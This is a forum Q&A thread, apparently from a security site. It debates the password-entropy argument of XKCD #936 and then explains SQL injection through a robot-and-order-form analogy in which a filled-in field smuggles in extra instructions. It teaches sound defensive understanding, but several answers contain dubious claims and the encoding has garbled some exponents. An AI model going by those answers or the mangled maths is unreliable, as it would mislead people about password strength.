QuestionKenntnis:
XKCD #936: Short complex password, or long dictionary passphrase?
qn_description:
How accurate is this XKCD comic from August 10, 2011?



I've always been an advocate of long rather than complex passwords, but most security people (at least the ones that I've talked to) are against me on that one. However, XKCD's analysis seems spot on to me. 

Am I missing something or is this armchair analysis sound?
AnswersKenntnis
AnswerKenntnis:
I think the most important part of this comic, even if it were to get the math wrong (which it didn't), is visually emphasizing that there are two equally important aspects to selecting a strong password (or actually, a password policy, in general):  


Difficulty to guess
Difficulty to remember


Or, in other words: 


The computer aspect
The human aspect


All too often, when discussing complex passwords, strong policies, expiration, etc (and, to generalize - all security), we tend to focus overly much on the computer aspects, and skip over the human aspects.   

Especially when it comes to passwords, (and double especially for average users), the human aspect should often be the overriding concern.
For example, how often does strict password complexity policy enforced by IT (such as the one shown in the XKCD), result in the user writing down his password, and taping it to his screen? That is a direct result of focusing too much on the computer aspect, at the expense of the human aspect.    

And I think that is the core message from the sages of XKCD - yes, Easy to Guess is bad, but Hard to Remember is equally so.
And that principle is a correct one. We should remember this more often:   


  Security at the expense of usability, comes at the expense of security.
AnswerKenntnis:
The two passwords, based on rumkin.com's password strength checker:


  Tr0ub4dor&3
  
  
  Length: 11
  Strength: Reasonable - This password is fairly secure cryptographically and skilled hackers may need some good computing power to crack it. (Depends greatly on implementation!)
  Entropy: 51.8 bits
  Charset Size: 72 characters
  


and 


  correct horse battery staple
  
  
  Length: 28
  Strength: Strong - This password is typically good enough to safely guard sensitive information like financial records.
  Entropy: 104.2 bits
  Charset Size: 27 characters
  


It is certainly true that length, all other things being equal, tends to make for very strong passwords -- and we're seeing that confirmed here.

Even if the individual characters are all limited to [a-z], the exponent implied in "we added another lowercase character, so multiply by 26 again" tends to dominate the results.

In other words, 7211 < 2728.

Now, what is not clearly addressed:


Will these passwords have to be entered manually? And if so, how difficult is it, mechanically, to enter a each character of the password? On a keyboard it's easy, but on a smartphone or console... not so much.
How easy are these passwords to remember? 
How sophisticated are the password attacks? In other words, will they actually attempt common schemes like "dictionary words separated by spaces", or "a complete sentence with punctuation", or "leet-speak numb3r substitution" as implied by xkcd? Crucially, this is how XKCD justifies cutting the entropy of the first password in half!


Point 3 is almost unanswerable and I think personally highly unlikely in practice. I expect it will be braindead brute force all the way to get the low-hanging fruit, and the rest ignored. If there isn't any low-hanging password fruit (and oh, there always is), they'll just move on to the next potential victim service.

Therefore I say the cartoon is materially accurate in terms of its math, but the godlike predictive password attacks it implies are largely a myth. Which means, IMHO, that these specific two passwords are kind of a wash in practice and would offer similar-ish levels of protection.
AnswerKenntnis:
Edit: there seems to lack a thorough explanation of the mathematics in this comic (at least not as detailed as it could be), so here it is.

The little boxes in the comic represent entropy in a logarithmic scale, i.e. "bits". Each box means one extra bit of entropy. Entropy is a measure of the average cost of hitting the right password in a brute force attack. We assume that the attacker knows the exact password generation method, including probability distributions for random choices in the method. An entropy of n bits means that, on average, the attacker will try 2n-1 passwords before finding the right one. When the random choices are equiprobable, you have n bits of entropy when there are 2n possible passwords, which means that the attacker will, on average, try half of them. The definition with the average cost is more generic, in that it captures the cases where random choices taken during the password generation process (the one which usually occurs in the head of the human user) are not uniform. We'll see an example below.

The point of using "bits" is that they add up. If you have two password halves that you generate independently of each other, one with 10 bits of entropy and the other with 12 bits, then the total entropy is 22 bits. If we were to use a non-logarithmic scale, we would have to multiply: 210 uniform choices for the first half and 212 uniform choices for the other half make up for 210┬╖212 = 222 uniform choices. Additions are easier to convey graphically with little boxes, hence our using bits.

That being said, let's see the two methods described in the comic. We'll begin with the second one, which is easier to analyze.

The "correct horse" method

The password generation process for this method is: take a given (public) list of 2048 words (supposedly common words, easy to remember). Choose four random words in this list, uniformly and independently of each other: select one word at random, then select again a word at random (which could be the same as the first word), and so on for a third and then a fourth words. Concatenate all four words together, and voila! you have your password.

Each random word selection is worth 11 bits, because 211 = 2048, and, crucially, each word is selected uniformly (all 2048 words have the same probability of 1/2048 of being selected) and independently of the other words (you don't choose a word so that it matches or non-matches the previous words, and, in particular, you do not reject a word if it happens to be the same choice as a previous word). Since humans are not good at all at doing random choices in their head, we have to assume that the random word selection is done with a physical device (dice, coin flips, computers...).

The total entropy is then 44 bits, matching the 44 boxes in the comic.

The "troubador" method

For this one, the rules are more complex:


Select a random word in a given big list of meaningful words.
Decide randomly whether to capitalize the first letter, or not.
For the letters which are eligible to "traditional substitutions", apply or not apply the substitution (decide randomly for each letter). These traditional substitutions can be, for instance: "o" -> "0", "a" -> "4", "i" -> "!", "e" -> "3", "l" -> "1" (the rules give a publicly known exhaustive list).
Append a punctuation sign and a digit.


The random word is rated to 16 bits by the comic, meaning uniform selection in a list of 65536 words (or non-uniform in a longer list). There are more words than that in English, apparently about 228000, but some of them are very long or very short, others are so uncommon that people would not remember them at all. "16 bits" seem to be a plausible count.

Uppercasing or not uppercasing the first letter is, nominally, 1 bit of entropy (two choices). If the user makes that choice in his head, then this will be a balance between user's feeling of safety ("uppercase is obviously more secure !") and user's laziness ("lowercase is easier to type"). There again, "1 bit" is plausible.

"Traditional substitutions" are more complex because the number of eligible letters depends on the base word; here, three letters, hence 3 bits of entropy. Other words could have other counts, but it seems plausible that, on average, we'll find about 3 eligible letters. This depends on the list of "traditional substitutions", which are assumed to be a given convention.

For the extra punctuation sign and digit, the comic gives 1 bit for the choice of which comes first (the digit or the punctuation sign), then 4 bits for the sign and 3 bits for the digit. The count for digits deserves an explanation: this is because humans, when asked to choose a random digit, are not at all uniform; the digit "1" will have about 5 to 10 times more chances of being selected than "0". Among psychological factors, "0" has a bad connotation (void, dark, death), while "1" is viewed positively (winner, champion, top). In south China, "8" is very popular because the word for "eight" is pronounced the same way as the word for "luck"; and, similarly, "4" is shunned because of homophony with the word for "death". The attacker will first try passwords where the digit is a "1", allowing him to benefit from the non-uniformity of the user choices.

If the choice of digit is not made by a human brain but by an impartial device, then we get 3.32 bits of entropy, not 3 bits. But that's close enough for illustration purposes (I quite understand that Randall Munroe did not want to draw partial boxes).

Four bits for punctuation are a bit understated; there are 32 punctuation signs in ASCII, all relatively easy to type on a common keyboard. This would mean 5 bits, not 4. There again, if the sign is chosen by a human, then some signs will be more common than others, because humans rarely think of '#' or '|' as "punctuation".

The grand total of 28 bits is then about right, although it depends on the precise details of some random selections, and the list of "traditional substitutions" (which impacts the average number of eligible letters). With a computer-generated password, we may hope for about 30 bits. That's still low with regards to the 44 bits of the "correct horse" method.

Applicability

The paragraphs above show that the maths in the comic are correct (at least with the precision that can be expected in these conditions -- that's a webcomic, not a research article). It still requires the following conditions:


The "password generation method" is known by the attacker. This is the part which @Jeff does not believe. But it makes sense. In big organizations, security officers publish such guidelines for password generation. Even when they don't, people have Google and colleagues, and will tend to use one of about a dozen or so sets of rules. The comic includes provisions for that: "You can add a few more bits to account for the fact that this is only one of a few common formats".

Bottom-line: even if you keep your method "secret", it won't be that secret because you will more or less consciously follow a "classic" method, and there are not that many of those.
Random choices are random and uniform. This is hard to achieve with human users. You must convince them to use a device for good randomness (a coin, not a brain), and to accept the result. This is the gist of my original answer (reproduced below). If the users alter the choices, if only by generating another password if the one they got "does not please them", then they depart from random uniformity, and the entropy can only be lowered (maximum entropy is achieved with uniform randomness; you cannot get better, but you can get much worse).


The right answer if of course that of @AviD. The maths in the comic are correct, but the important point is that good passwords must be both hard to guess and easy to remember. The main message of the comic is to show that common "password generation rules" fail at both points: they make hard to remember passwords, which are nonetheless not that hard to guess.

It also illustrates the failure of human minds at evaluating security. "Tr0ub4dor&3" looks more randomish than "correcthorsebatterystaple"; and the same minds will give good points to the latter only because of the wrong reason, i.e. the widespread (but misguided) belief that password length makes strength. It does not. A password is not strong because it is long; it is strong because it includes a lot of randomness (all the entropy bits we have been discussing all along). Extra length just allows for more strength, by giving more room for randomness; in particular, by allowing "gentle" randomness that is easy to remember, like the electric horse thing. On the other hand, a very short password is necessarily weak, because there is only so much entropy you can fit in 5 characters.

Note that "hard to guess" and "easy to remember" do not cover all that is to say about password generation; there is also "easy to use", which usually means "easy to type". Long passwords are a problem on smartphones, but passwords with digits and punctuation signs and mixed casing are arguably even worse.



Original answer:

The comic assumes that the selection of a random "common" word yields an entropy of about 11 bits -- which means that there are about 2000 common words. This is a plausible count. The trick, of course, is to have a really random selection. For instance, the following activities:


select four words randomly, then remember them in the order which makes most sense;
if the four words look too hard to remember, scrap them and select four others;
replace one of the words with the name of a footballer (the attacker will never guess that !);


... all reduce the entropy. It is not easy to get your users to actually use true randomness and accept the result.

The same users will probably complain about the hassle of typing a long password (if the typing involves a smartphone, I must say that I quite understand them). An unhappy user is never a good thing, because he will begin to look for countermeasures which will make his life easier, such as keeping the password in a file and "typing" it with a copy&paste. Users can often be surprisingly creative that way. Therefore long passwords have a tendency to backfire, security-wise.
AnswerKenntnis:
I agree that length is often preferable to complexity. But I think the controversy is less around that, and more around how much entropy you want to have.  The comic says that a "plausible attack" is 1000 guesses/second:


  "Plausible attack on a weak remote web service.  Yes, cracking a
  stolen hash is faster, but it's not what the average user should worry
  about"


But I see more of a consensus that web site operators can't keep their hash databases secure over time against attackers, so we should engineer the passwords and hash algorithms to withstand stealing the hashes for offline attack.  And an offline attack can be massive, as described at How to securely hash passwords?

This makes the problem even harder, and sites should really be looking at options besides requiring users to memorize their own passwords for each web site, e.g. via OpenID and OAuth.  That way the user can get one good authentication method (perhaps even involving a hardware token) and leverage it for web access.

But good password hashing can also be done via good algorithms, a bit more length, and bookmarklet tools.  Use the techniques described at the above question on the server (i.e. bcrypt, scrypt or PBKDF2), and the advice at Is there a method of generating site-specific passwords  which can be executed in my own head? on the use of SuperGenPass (or SuperChromePass) on the user/client end.
AnswerKenntnis:
I think most of the answers here are missing the point.  The final frame is talking about ease of memorization.  correct horse battery staple (typed from memory!!) eliminates the fundamental danger of password security -- The Post-IT note.  

Using the first password, I've got a Post-IT note in my wallet (if I'm smart) or in my desk drawer (if I'm dumb) which is a huge security risk.  

Lets assume that the pass phrase option is only as secure as the munged base word option, then I'm already better off because I've eliminated the human failing in password storage. 

Even if I wrote down the pass phrase, it wouldn't look like a password.  It might be a shopping list - Bread Milk Eggs Syrup.  But 5t4ck3xCh4ng3 is very obviously a password. If I came across that, It would be the first thing I would try.
AnswerKenntnis:
To add to Avid's excellent answer, the other key messages of the comic are:


the appropriate way to calculate the entropy of a password generation algorithm is to calculate the entropy of its inputs, not to calculate the apparent entropy of its outputs (as rumkin.com, grc.com etc. do)
minor algorithm variations such as "1337-5p34k" substitutions and "pre/append punct & digits" add less entropy than most users (or sysadmins) think
(more subtly) passphrase entropy depends on wordlist size (and number of words), not number of characters, but can still provide easily sufficient entropy to protect against "generation algorithm aware" brute force attacks


To those messages we might wish to add:


as a user you can't generally control whether the web site operator uses salting, bcrypt/scrypt/PBKDF2, keeps their password hashes safe, or even whether they hash passwords in the first place -- so you should probably choose passwords that matter on the basis that they don't (e.g. assume 10^9 guesses per second when sizing passwords/phrases, don't reuse passwords and don't use simple "append the site name" techniques) - which probably makes using LastPass/KeePass/hashpass inevitable
long complicated words don't add much to the entropy unless you use more than a couple of them (there are only ~500K words in English, which is only 19 bits -- just 8 bits more than a word from Randall's 2048-word list)
the "random words" need to be really random for this to work -- picking song lyrics/movie quotes/bible verses gives much lower entropy (e.g. even with perfectly random choice, there are only 700K words in the bible, so there are only ~4M 5-10 word bible phrases, which is only 22 bits of entropy)
AnswerKenntnis:
The issue is still, sadly, a human one.

Will pushing users to alphanumeric + punctuation passwords be safer, or longer passwords?

If you tell them to user alpha + numbers, they will write their name + birthday. If you tell them to use also use punctuation, they will replace an "a" with "@", or something similarly predictable.

If you tell them "use four simple words", they will write "i love my mother", "i love your mother", "thank god its friday" or something else banally predictable.

You just can't win. The advantage of 4 word passwords is, they can memorize it, so if you are going to force users to have strong passwords (which you generate) then at least they won't need to write it down on a post-it note, or email themselves the password, or something else stupid.
AnswerKenntnis:
I love xkcd and agree with his basic point -- passphrases are great for adding entropy, but think he low balled the entropy on the first password.

Let's go through it:


Random dictionary word.  xkcd: 16 bits, Me: 16 bits.  A random word from a dictionary with ~65000 words is lg(65000) ~ 16.  Very reasonable
Adding in capitalization.  xkcd: 1 bit, Me: 0 bits (deal with in common subsitutions).  1 bits means its there or not there -- which seems very low for the complexity added by adding capitalization to a password -- generally when capitalization to a password its in a random place or I can think of other many possible capitalization schemes (capitalize everything, capitalize the last letter).  I'm going to group this with common substitutions.
Common substitutions.  xkcd: 3 bits, Me: 13 bits.  Only 8 choices for leet speak substitutions, even when only sometimes used?  I can think of on average ~2 ways to leet alter each letter (like a to @,4; b to 8,6; c to (,[, <) and add in the original or capitalizing the letter, then for a 9 letter password, I've increased the entropy by 18 (lg(4**9)=18), if I randomly choose each letter to leet alter or not.  This is too high for this password, however.  A more reasonable approach would be say I randomly chose say 4 letters to "common substitutions" to (one of two leet options, plus capitalization for three options for each letter being substituted).  Then it gets to lg( nCr(9,4) 3*4) ~ 13 bits.
Adding two random characters '&3' to the end. xkcd: 8 bits, Me: 15 bits.  I'm considering it as two characters to one of ~4 places (say before the word, one before and one after, both after, or both smack in the middle of the word). I'll also let non-special characters be in these two added letters.  So assuming an 88 character dictionary (56 characters+10 digits, plus 32 symbols) you add lg(4 * 80**2) ~ 15 bits of entropy. 


So I have the calculation as not being 16+2+2+8=28 bits of entropy, but being 16+13+15=44 bits very similar to his passphrase.

I also don't think 3 days at 1000 guesses/sec is by any means "easy" to guess or the plausible attack mechanism.  A remote web service should detect and slow down a user trying more than 10000 guesses in a day period for any specific user.  

Much more likely are other attacks (e.g., key loggers on public computers, a malicious admin at a service logging passwords and reusing them, eavesdropping if ssl not used, get access to the server somehow (e.g., SQL injection; break into server room; etc)).

I use a passphrase when its necessary -- e.g., strong encryption (and not 44-bits more like 80-bits -- typically 8 word diceware passphrase plus two or three modifications -- e.g., misspell a word or substitute a word for a non diceware word starting with the same two letters; E.g., if you had "yogurt" come up maybe substitute it for "yomama").  For websites (no money involved or security permissions), I don't care about trivial passwords are typically used.

I do notice that for often used passwords, I'm much much better at typing passwords then I am at typing my passphrases (which get annoying when you have to re-key in a ~50 character sentence a few times).  Also for passwords, I often prefer finding a random sentence (like a random song lyric -- to a song no one would associate with you that's not particularly meaningful) and come up with a password based on the words (like sometimes use first letter; last letter; or substitute a word for a symbol; etc).  E.g. L^#g&B9y3r from "Load up on guns and bring your" from Smells Like Teen Spirit.



TL;DR:  Randall is right, if you (a) assume you can check passwords at 1000/s for three days without getting slowed down, and (b) can make many assumptions about the password: constructed based on a rare dictionary word, that is capitalized, has some leet substitutions for some commonly substituted letters, and has a symbol and number added at the end.  If you only slightly generalize the allowed substitutions (like I did) and characters added at the end, you get a similar entropy to the passphrase.

In summary, both are probably secure for most purposes with a low threat level.  You are much more vulnerable by other exploits, something Randall would likely agree with [538] [792].  In general having password requirements like having a upper/lower/symbol/number is good, as long as long high-entropy passphrases are also allowed.  Force additional complexity for shorter  passwords, but allow over ~20 characters to be all lower case.  Some users will choose poor passphrases just as they choose poor passwords (like "this is fun" which is idiotically claimed to be ridiculously secure here or using their child's name or their favorite sports team).  Requiring special characters may make it non-trivial to easily guess (say by a factor of 100-1000 -- changing a password from being 10 likely guesses to 10000 is very significant).  Sure it won't prevent any bot on a weak web service that allows thousands of bad login attempts per second, but it forces an addition of a modest level of security which would hinder efforts at sites that limit bad logins or from the unsophisticated manually guessing the password.  Sort of like how a standard 5-pin house lock is fundamentally insecure as anyone can learn to pick it in minutes (or break the glass window); however in practice locking your door is good as it provides some safety against the unsophisticated who don't have tools handy (and breaking windows comes with its own dangers of alerting others).
AnswerKenntnis:
Looking at the XKCD comic, and at examples of real world passwords, we see that most users have passwords much much weaker than the XKCD example.

A bunch of users will do exactly as the first panel says - they'll take a dictionary word, capitalise the first letter, do some gentle substituting, then add a number and symbol to the end.  That's quite bad, especially if they re-use that password (because they think it's strong) or if their account has privs.

As has been mentioned in comments, Diceware is a nice way to generate a passphrase. I'd like to see the easy read version of a formal analysis of Diceware.  (I suspect that even if the attacker has your dictionary and knows that your passphrase is 5 or 6 words long that Diceware is better than a bunch of other password generation systems.

But, whatever password they have, many users can be persuaded to change it to a known value:

http://passwordresearch.com/stories/story72.html 


  During a computer security assessment, auditors were able to convince 35 IRS managers and employees to provide them with their username and change their password to a known value. Auditors posed as IRS information technology personnel attempting to correct a network problem.
AnswerKenntnis:
Randall is mostly correct here.  A few additions:

Of course you have to choose the words randomly.  The classic method is Diceware, which involves rolling 5d6, giving almost 13 bits of entropy per word, but the words are more obscure.

There may be 2048 common words in English, but there aren't 2048 short common words in English.  The Diceware list (which has 6^5 = 7776 words under 6 letters long) has some pretty obscure stuff in it, plus names, plurals, two-letter combinations, two-digit combinations, 19xx, etc, and I don't think the top quarter of that would be much better.  If you just take the top 2k word in English, you get stuff like "multiplication" which is a bit long as part of a 4-word password.  So I'd be interested to see Randall's suggested word list.

There are more obvious variations of "Tr0ub4dor&3"-type passwords than of Diceware ones, so in practice the former will have a couple more bits of entropy.  Also, in my experience, "Tr0ub4dor&3" type passwords are not actually that hard to remember if you use them often.  In the past, I've generated several passwords with strings /dev/urandom, and had no trouble using them as login passwords.  Today, though, I couldn't tell you which of the letters were capitalized.  On the other hand, I'm not sure I could recite some of my Diceware passwords without confusing homophones, pluralization, etc.

If the password database is stolen, a strengthener like PBKDF2 would add a word or more to to the effective length of one of these passwords, but many sites don't use it.  5 words + one for the strengthener would yield some 66 bits, which is probably too big for a rainbow table.  This puts you well out of range of casual attackers, so unless you have something really important on your account you should be fine.

In sum, Diceware-type passwords are ideal for things you type occasionally, but not necessarily every day.  If you use a password every day, then Diceware would work, but a strings /dev/urandom password will be shorter and you should be able to memorize it anyway.  If you log in rarely, then choose a password in any way you like, toss it into your password manager (which you should use for the more commonly-used passwords too), and forget it.

If a site has some odd restriction, like "no spaces, at least one upper-case letter and at least one number", then string the words together with 5s between them and cap the first letter.  This loses epsilon entropy for Diceware and none for Randall's scheme.
AnswerKenntnis:
I'm not a security expert, but I think there's a mistake here.  

The point of the comic seems to indicate that by increasing the length of the password, you will increase the complexity.  

The complexity of a four word password is actually significantly reduced.  Essentially you've swapped 8-11 semi randomly selected characters for 4 randomly selected words.  The length of the pass-phrase is less important than the number of words.  All that is required is that the attacker attempts various combinations of words from a dictionary.  Words used are likely to be fairly common if they are to be remembered and are likely to be short if they must be typed.  

Dictionary attacks are already used to great effect. We don't commonly use 260,000 words. We only know around 12,000 to 20,000 words. Of these we commonly use less than 8,000. I can't imagine regular users are going to create passwords which contain long and complicated words to type which further reduces the subset of possible words.  Assuming that everyone were to start using this method of password selection, then dictionary attacks would actually become far more effective.

Now, a combination of the two may be more secure, although this defies the point of the exercise.
AnswerKenntnis:
Reading the comment, I have a few thoughts.


The entropy count on the password is rated quite low. At the very least, you should add in another 1-3 bits for character substitutions. In this example, it seems like the exact formula is known, which seems a bit unlikely.
The entropy count of the longer password seems correct to me.
The base word seems to be "Troubador", if I'm deciphering the common substitutions correctly. I don't think that's a common word, so limiting the entropy of a dictionary based word to only 11 bits of entropy is a bit low. I'm guessing that it would still be in a dictionary, but should be expanded to at least a 15 bit entropy, or a selection of 32K words. That seems to be about the level it would be at using a dictionary based attack.


It is true that in principal, a long password composed of random words is at least as good of a password as a short password with more characters, but the words must be random. If you start quoting a well known phrase, or even anything that could be a sentence or part of one, it severely limits the entropy.
AnswerKenntnis:
A lot of the responses to this question raise the obvious point that even if you ask users to use several words separated by spaces for readabilty, too many users will choose words in "banal" phrases, like "i love my mom", which, if crackers were cognizant that such simple phrases were in common use, would be quickly cracked.  I assume that some crackers may already be doing this -- they're not stupid after all!  But all is not lost.

Too many websites that I have login relationships with require me to make my password more complex (using leetspeakish and other combination requirements for upper/lowercase, numerics and symbols).  They enforce making my passwords hard to remember.

What if instead of requiring complexity, a password validattion check was performed that first checked a recognized password dictionary, and once a dictionary attack was eliminated as a problem, it would calculate the strength against a bruteforce attack, and require only that a password be able to hold off bruteforce attack for a trillion years?  In that instance, Tr0ub4dor&3 would not pass -- Steve Gibson's search space calculator at https://www.grc.com/haystack.htm says it could be brute-forced in only 1.83 billion centuries, but "hold wine fine cold" could withstand it for 1.43 billion trillion centuries.

What I am trying to say here is to stop forcing users to come up with bizarre character combinations, and actually vet their passwords against dictionary and brute force attacks.  I think security could only improve as a result.
AnswerKenntnis:
There was an old tool called L0phtCrack for breaking Windows passwords by running dictionary attacks against LM hashes. It still seems to be around but turned commercial now. That tool had guessed my three word password including a numeric suffix (which was similar to the string "correct horse battery0") in seconds. That was in 1999. The machine ran Windows NT 4.0. The guessing machine was a P-II 350Mhz. 

When I moved the zero to the beginning of the password it failed to find it. But I can easily say that the password guessing algorithms were already smart enough for XKCD's scheme 12 years ago. Today they got to be better.

On the other hand thinking of the progress authentication schemes have made such as increased bit lengths, better hashing algorithms, computational time required might have increased. 

EDIT: I just noticed that the password I had used back then was actually a brand. It wasn't random. So I think that's how it was possible for l0pht to guess my password because it was already in the dictionary.
AnswerKenntnis:
I agree with Jeff Atwood. Also, I have taken a (not the) English dictionary I have here in MSSQL with 266,166 words in it (and also 160,086 German and 138,946 Dutch words) and taken a random selection of 10 words for each language. 

These are the results for English:


clever-handed
wolframinium
muth
unvolcanic
contradictorily
desperadoism
unpreternatural
placability
recondensation
Remi


Now take any combination of any words that will give you enough entropy and you're good to go. But as you might see from this example it's not very easy to make something easy to remember out of this wordjumbo. So entropy goes down a lot when you're trying to create "understandable (not correct or logical) sentences".

For completeness' sake (random) results for German and Dutch:

German:


torlos
Realisierung
hinterhaeltigsten
anbruellend
Orthograpie
vielsilbigen
lebensfaehig
drang
festgeklebtes
Bauernfuehrer


Dutch: 


spats
bijstander
Abcoude
vergunningsaanvraag
schade-eis
ammoniakuitstoot
onsentimenteel
ebstand
radiaalband
profielschets
AnswerKenntnis:
The Openwall Linux pwqgen tool generates passwords with a specific amount of entropy along these very lines. 

However, instead of using spaces to separate words, punctuation characters and digits are used instead. Here's ten examples with 64 bits of entropy:

Cruise!locus!frame
tehran!Commit6church
Seller7Fire3sing
Salt&Render4export
Forget7Driver=Tried
Great5Noun+Khaki
hale8Clung&dose
Ego$Clinch$Gulf
blaze5vodka5Both
utmost=wake7spark


The words are harder to read without their spaces, but in the years that I've been using passwords generated with this tool, I haven't found the punctuation to be difficult to remember.
AnswerKenntnis:
I've wondered about this one as well, and I would like to analyze it from a philisophical point (if user's write down their passwords, it becomes something you have instead of something you know... 2-factor becomes 1-factor), but a mathamatical and scientific standpoint. 

I recently downloaded a GPU password cracking software to play around with. I'd like to crack both of these passwords using that (since it's my new toy) and determine which is better.

For a hypothesis, I would like to also throw out a possible variable--the attacker may know you only use dictionary words and don't enforce symbols and numbers (decreasing the key space).

Scenario 1

- Attacker knows you only used dictionary words. (Keyspace = 26 letters + 26 capitals + 1 space = 53).
- Password requirement is must have 4 dictionary words with a minimum total characters of 20.  


Scenario 2

- Same as Scenario 1, except Attacker doesn't know only dictionary words are used (keyspace increases).


Against 2 control groups where the random passwords contain a 2 numbers, a 2 special characters and is 16 characters long. 

Would this be an appropriate test? If not, let me know, and I'll edit the parameters.
AnswerKenntnis:
Bruce Scheiner loves long passphrases but he also has been pointing out the practical difficulties of a long passphrase for many years. Passwords are not echoed on the screen when you type them. You see an asterisk or a big fat black dot on the screen per letter. Even when typing out 7-8 character passwords you occasionally wonder in the middle if you have typed it right. So you backspace everything and start again. Occasionally we forget where we are in the middle of the password & count number of characters already typed and comparing it mentally with the password to figure out where we are. It would be even more difficult to do this with a long passphrase if it's not being echoed. I think long passphrases will happen only after this problem has been effectively solved.
AnswerKenntnis:
I think there is a problem with the XKCD comic here.  It assumes a brute force attack on your password.  If you picked a single dictionary word you could simply dictionary attack it, that's a given.  You could also brute force an 8 character word in little time.  Either way it's easy.  

Increasing the number of words does increase the amount of entropy, but if you change the manner of the attack it's not as good as a brute force attack.  i.e. if your cracker suspects that you use multiple dictionary words then he'll just use dictionary words concatenated together and wont do a brute force attack at all.
AnswerKenntnis:
The XKCD comic does not explicitly depict that passphrases may contain separator symbols between the words. A natural choice is to add the same symbol between all words. If the app has a show password option, the phrase can be red easily. 
In theory that adds 5 bits of strength, downgraded to 4 bits, see The "troubador" method of explanation of the mathematics in this comic

The exact downgrading also depends on how easy it is for an attacker to guess the symbol, or first try specific separator symbols. That's why I use 3 distinct sets of symbols to calculate this type of strengthening. 
Set1: 13 symbols from the iPhone number-symbols, 31 symbols for all of them, and a special set of 3, for the often used separator symbols: space - _ 

I use the following for the calculation (Excel notation, only if  a separator symbol is being used): 

strength = >> see below for a simplification
=log(  NumWordsInCurrentDict*((sepaClassSize^(SepratorLen)+1)*(NumWordsInCurrentDict)^(nWordInPhrase-1))    , 2) 

4 Diceware words give the following strengths:  No separator: 51.7 bits; A space separator: 53.3 bits; and  a separator from all 31 symbols like ^ : 56.7 bits

============= edit en edit2: forgot the log 2, fixed

The simplified formula for the above one is:
log(  ((sepaClassSize+1)^SepratorLen)*(NumWordsInCurrentDict^numWordsInPhrase)  ,  2 )

The XKCD comic depicts extensive modification/substitution options for passwords. The Diceware Passphrase Home Page mentions a special modification that is not in the comic pass phrase part: insert just 1 random letter in just 1 of the words of the phrase chosen. That would add another 10 bits of entropy.(see the section "Optional stuff you don't really need to know")
AnswerKenntnis:
According to me pass-phrase is the one of the secure way than passwords.

Using any of attacking techniques like brute force, passwords can be hacked or might be stolen. Once password gets aware to the intrusion can harm you till you change you password.

On other hand, if you go with pass-phrase, though your pass-phrase gets stolen or come to know to intrusion, will not be that much harmful as password. Because pass-phrase keeps changing so attacker always have to use different algorithm to crack it. 

Also combination of both like passwords+pass-phrase also do the work in more secure way than using one of them as singleton for security.
AnswerKenntnis:
Totally wrong. There's more than math at work here. Human beings creating passwords out of human language != bots creating randomized strings out of buckets of char. If you start with that assumption, entropy is radically reduced as a factor in the time necessary to crack the password. As Don Corleone, the great philosopher, said: Think like the people who are around you.
AnswerKenntnis:
As some people already stated (so I'm not going to repeat that), it depends on the mechanism of brute-force attacks and dictionary attacks being used.

First of all, the best way to keep an attacker from attacking is taking away the target in the first place. None of my servers have SSH running on port 22 and root login is most always deactivated in sshd configuration. But that's just an example. Don't give away the user name and you can save yourself a lot of trouble.

That's the simplest of math: Avoid attacks by others by hiding :)

So, for the rest: Those who actually guess the username right and find your service, will try very common brute-force attacks. Short passwords are always a bad idea, because there's no dictionary needed. Cycling through all the alphanumberic combinations in both lower and uppercase and common 'salt' like commas, semicolons and so on would take a few days to crack. Based on my own experience (had an old OpenBSD routing machine setup, but the internet provider password changed and I didn't have physical access to the machine). The password turned out to be [Firstname][Lastname][Number] of some celebrity.

I was curious, so I tried different cracking tools. A name-based one took only six hours to crack the same password. Guess it was cycling through common name/number combinations.

The trick with those brute-force attacks is to know what you're dealing with. A password that is based on something personal, that is encrypted with your own method is still safe from most dictionary attacks and can only be guessed by a simple brute-force attack, which would take years to cycle through all the possibilities.

Give you an example: My name is Andreas, so my password is kinda safe.

MyN4me,A->PwKndSf

According to rumkin, this is kinda safe :) 87.1 bits entropy. Wow. Not bad for a first try. I can actually remember that and most mechanisms will not attempt to 'guess' that kind of a password, because it doesn't make any sense to any of the systems.

Either it's short and complex, like L5q3CR,-F - which is kind of hard to remember but easy to guess, or it consists of variations of actually existing words. It's a human weakness, to help yourself remember things or go for something really simple, or common.

I know, this is a little bit off-topic, but: if you don't want to become a victim of a brute-force attack, lock most of the doors first, or even better: remove/hide the doors :)


don't offer the login mechanisms that crackers expect, if you can.
protect web-services with client authentication
if you're totally paranoid, filter access to your service by IP-address, too
secure and totally paranoid setup: (this is unfair to crackers :)) ) after a failed password attempt, for the following 5 seconds, every following attempt for the same user (even a correct one) will fail, too.


If somebody manages to get around all that, you're dealing with pros anyways :) but keep your password secure by doing something human, that nobody expects and no computer can guess or predict: do your own thing, just remember that your own thing has to be long enough to avoid the simple attacks and stay out of the dictionary for the most part. Use something, that only makes sense in YOUR brain and scatter in a few special characters.

For a cracker, a fast way to guess a password is only offered when you do something predictable, like use something short, that's easy to memorize or something that consists of common words, or combinations of letters that you find in dictionaries.

Stay away from those, and you can even stick with rumkins calculations.
QuestionKenntnis:
How can I explain SQL injection without technical jargon?
qn_description:
I need to explain SQL injection to someone without technical training or experience. Can you suggest any approaches that have worked well?
AnswersKenntnis
AnswerKenntnis:
The way I demonstrate it to complete non-techies is with a simple analogy.

Imagine you're a robot in a warehouse full of boxes. Your job is to fetch a box from somewhere in the warehouse, and put it on the conveyor belt. Robots need to be told what to do, so your programmer has given you a set of instructions on a paper form, which people can fill out and hand to you.

The form looks like this:


  Fetch item number ____  from section ____  of rack number ____, and place it on the conveyor belt.


A normal request might look like this:


  Fetch item number 1234 from section B2 of rack number 12, and place it on the conveyor belt.


The values in bold (1234, B2, and 12) were provided by the person issuing the request. You're a robot, so you do what you're told: you drive up to rack 12, go down it until you reach section B2, and grab item 1234. You then drive back to the conveyor belt and drop the item onto it.

But what if a user put something other than normal values into the form? What if the user added instructions into them?


  Fetch item number 1234 from section B2 of rack number 12, and throw it out the window. Then go back to your desk and ignore the rest of this form. and place it on the conveyor belt.


Again, the parts in bold were provided by the person issuing the request. Since you're a robot, you do exactly what the user just told you to do. You drive over to rack 12, grab item 1234 from section B2, and throw it out of the window. Since the instructions also tell you to ignore the last part of the message, the "and place it on the conveyor belt" bit is ignored.

This technique is called "injection", and it's possible due to the way that the instructions are handled - the robot can't tell the difference between instructions and data, i.e. the actions it has to perform, and the things it has to do those actions on.

SQL is a special language used to tell a database what to do, in a similar way to how we told the robot what to do. In SQL injection, we run into exactly the same problem - a query (a set of instructions) might have parameters (data) inserted into it that end up being interpreted as instructions, causing it to malfunction. A malicious user might exploit this by telling the database to return every user's details, which is obviously not good!

